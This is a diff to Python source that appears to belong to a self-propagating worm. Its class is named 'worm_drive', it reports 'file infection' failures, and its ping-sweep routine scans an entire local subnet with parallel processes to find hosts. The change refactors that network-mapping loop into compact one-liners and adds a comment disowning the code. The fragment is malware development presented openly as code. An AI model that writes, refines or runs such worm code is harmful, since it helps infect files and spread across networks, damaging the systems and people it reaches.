@@ -44,6 +44,7 @@ class worm_drive:
             except Exception as e:
                 print('[-] file infection failed on ' + i + " reason is " + str(e))
                 time.sleep(1)
+# This is not my code. 
 def pinger(job_q, results_q):
     """
     Do Ping
@@ -97,20 +98,9 @@ def map_network(pool_size=255):
     results = multiprocessing.Queue()
 
     pool = [multiprocessing.Process(target=pinger, args=(jobs, results)) for i in range(pool_size)]
-
-    for p in pool:
-        p.start()
-
-    # cue hte ping processes
-    for i in range(1, 255):
-        jobs.put(base_ip + '{0}'.format(i))
-
-    for p in pool:
-        jobs.put(None)
-
-    for p in pool:
-        p.join()
-    [p.start() for p in pool], [jobs.put(base_ip + '{0}'.format(i)) for i in range(1,255)]
+    [p.start() for p in pool], 
+    [jobs.put(base_ip + '{0}'.format(i)) for i in range(1,255)] ,
+    [jobs.put(None) for p in pool], [p.join() for p in pool]
 
     # collect he results
     while not results.empty():
